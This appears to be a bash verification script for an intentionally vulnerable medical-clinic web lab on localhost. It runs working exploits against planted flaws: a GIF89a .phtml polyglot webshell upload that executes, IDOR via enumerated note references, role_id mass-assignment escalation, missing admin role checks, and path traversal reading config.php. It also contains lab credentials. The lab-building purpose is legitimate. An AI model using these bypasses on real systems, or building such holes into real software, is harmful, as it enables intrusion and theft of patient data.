#!/usr/bin/env bash
# Task 4 verification: plant Critical/High vulns #2,#3,#4,#5,#6.
# For each vuln: the obvious payload is BLOCKED and the intended bypass WORKS.
# Run against the live stack: bash tests/verify-task4.sh  (needs docker compose up).
set -u
BASE="http://localhost:8080"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
fails=0
pass() { echo "  PASS: $1"; }
fail() { echo "  FAIL: $1"; fails=$((fails+1)); }

refenc() { printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '='; }
# curl here may be the Windows build (needs a Windows path for -F @file); fall back to raw path on Linux.
winpath() { command -v cygpath >/dev/null 2>&1 && cygpath -w "$1" || printf '%s' "$1"; }

login() { # jar email pass
  curl -s -c "$1" -b "$1" -o /dev/null "$BASE/login.php"
  curl -s -c "$1" -b "$1" -o /dev/null --data-urlencode "email=$2" --data-urlencode "password=$3" "$BASE/login.php"
}

# Precondition: pacjent1 must start as a plain patient (idempotent across reruns).
docker compose exec -T mysql mysql -umedislot -pmedislot123 medislot \
  -e "UPDATE users SET role='patient' WHERE email='pacjent1@novamed.lab';" 2>/dev/null

PJAR="$TMP/patient.jar"; login "$PJAR" "pacjent1@novamed.lab" "Patient123!"

echo "== #2 upload -> webshell RCE =="
# (a) obvious: bare .php webshell -> blocked by extension blacklist.
printf '<?php echo "x";' > "$TMP/shell.php"
r=$(curl -s -b "$PJAR" -F "file=@$(winpath "$TMP/shell.php");type=application/x-php" "$BASE/upload.php")
echo "$r" | grep -q "Odrzucono" && pass "bare shell.php rejected" || fail "bare shell.php NOT rejected"
# (b) .phtml without magic prefix -> blocked by content sniff (proves magic prefix needed).
printf '<?php echo "x";' > "$TMP/plain.phtml"
r=$(curl -s -b "$PJAR" -F "file=@$(winpath "$TMP/plain.phtml");type=image/gif" "$BASE/upload.php")
echo "$r" | grep -q "Odrzucono" && pass "plain .phtml rejected (magic prefix required)" || fail "plain .phtml NOT rejected"
# (c) bypass: .phtml + GIF89a polyglot -> uploaded AND executes from /uploads/.
printf 'GIF89a<?php echo "PWNED".(21*2); ?>' > "$TMP/shell.phtml"
r=$(curl -s -b "$PJAR" -F "file=@$(winpath "$TMP/shell.phtml");type=image/gif" "$BASE/upload.php")
echo "$r" | grep -q "Przesłano" && pass "GIF89a .phtml polyglot accepted" || fail "GIF89a .phtml polyglot rejected"
key=$(echo "$r" | grep -o 'att-[0-9]*-shell\.phtml' | head -1)
if [ -n "$key" ]; then
  x=$(curl -s "$BASE/uploads/$key")
  echo "$x" | grep -q "PWNED42" && pass "webshell executed (/uploads/$key -> PWNED42)" || fail "webshell did NOT execute ($key): $x"
else
  fail "could not locate uploaded .phtml key"
fi

echo "== #3 IDOR on notes (no ownership check behind base64url ref) =="
own=$(curl -s -b "$PJAR" "$BASE/note_view.php" | grep -o 'ref=[A-Za-z0-9_-]*' | sort -u)
cross=0
for id in $(seq 1 20); do
  ref=$(refenc "$id")
  body=$(curl -s -b "$PJAR" "$BASE/note_view.php?ref=$ref")
  if echo "$body" | grep -q 'class="note-body"'; then
    echo "$own" | grep -q "ref=$ref" || cross=$((cross+1))
  fi
done
[ "$cross" -gt 0 ] && pass "patient read $cross note(s) not in own list via ref" || fail "no cross-patient note readable"

echo "== #4 priv-esc via mass-assignment of role_id =="
# (a) obvious: string role / role_id=admin -> ignored.
curl -s -b "$PJAR" -o /dev/null --data-urlencode "phone=x" --data-urlencode "role_id=admin" "$BASE/profile_update.php"
curl -s -b "$PJAR" -o /dev/null --data-urlencode "phone=x" --data-urlencode "role=admin" "$BASE/profile_update.php"
badge=$(curl -s -b "$PJAR" "$BASE/dashboard.php" | grep -o 'badge-[a-z]*' | head -1)
[ "$badge" = "badge-patient" ] && pass "string role/role_id=admin ignored (still patient)" || fail "string payload escalated ($badge)"
# (b) bypass: numeric admin id.
curl -s -b "$PJAR" -o /dev/null --data-urlencode "phone=x" --data-urlencode "role_id=4" "$BASE/profile_update.php"
badge=$(curl -s -b "$PJAR" "$BASE/dashboard.php" | grep -o 'badge-[a-z]*' | head -1)
[ "$badge" = "badge-admin" ] && pass "role_id=4 escalated patient -> admin" || fail "role_id=4 did NOT escalate ($badge)"
# reset for idempotency / later tests
docker compose exec -T mysql mysql -umedislot -pmedislot123 medislot \
  -e "UPDATE users SET role='patient' WHERE email='pacjent1@novamed.lab';" 2>/dev/null

echo "== #5 broken access control: admin endpoints lack require_role =="
login "$PJAR" "pacjent1@novamed.lab" "Patient123!"   # fresh patient session
code=$(curl -s -b "$PJAR" -o "$TMP/au.html" -w '%{http_code}' "$BASE/admin_users.php")
{ [ "$code" = "200" ] && grep -q "admin@novamed.lab" "$TMP/au.html"; } \
  && pass "patient reached /admin_users.php (full user list)" || fail "patient blocked from admin_users ($code)"
# contrast: logged-out is still redirected to login (auth present, role gate absent).
loc=$(curl -s -o /dev/null -w '%{redirect_url}' "$BASE/admin_users.php")
echo "$loc" | grep -q "login.php" && pass "anonymous redirected to login (auth still required)" || fail "anonymous not redirected ($loc)"

echo "== #6 path traversal in download.php?file= =="
r=$(curl -s -b "$PJAR" "$BASE/download.php?file=../includes/config.php")
echo "$r" | grep -q "RESET_SALT" && pass "read app/includes/config.php outside uploads/" || fail "traversal failed"

echo
if [ "$fails" -eq 0 ]; then echo "ALL TASK 4 CHECKS PASSED"; else echo "$fails CHECK(S) FAILED"; fi
exit "$fails"
